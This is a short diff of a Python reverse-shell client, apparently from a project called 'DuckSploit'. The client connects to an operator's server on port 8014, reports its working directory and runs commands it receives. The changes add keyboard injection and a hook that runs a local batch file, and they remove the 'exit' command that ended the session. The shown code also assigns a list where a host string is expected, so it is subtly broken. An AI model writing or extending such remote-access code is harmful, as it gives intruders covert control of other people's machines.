@@ -2,8 +2,14 @@ import socket
 import os
 import subprocess
 import sys
+import keyboard
 
-SERVER_HOST = "192.168.1.50"
+
+f = open("C:\DuckSploit\myip.txt","r")
+lines = f.readlines()
+
+
+SERVER_HOST = lines
 SERVER_PORT = 8014
 BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, feel free to increase
 # separator string for sending 2 messages in one go
@@ -17,15 +23,17 @@ s.connect((SERVER_HOST, SERVER_PORT))
 cwd = os.getcwd()
 s.send(cwd.encode())
 
+
 while True:
     # receive the command from the server
     command = s.recv(BUFFER_SIZE).decode()
     splited_command = command.split()
-    if command.lower() == "exit":
-        # if the command is exit, just break out of the loop
-        break
+    if command == "type esc":
+        keyboard.press('esc')
+    
     if splited_command[0].lower() == "ds":
-        os.system("call C:\DuckSploit\ds.bat")
+        os.system("""call C:\DuckSploit\ds.bat""")
+    
     if splited_command[0].lower() == "cd":
         # cd command, change directory
         try:
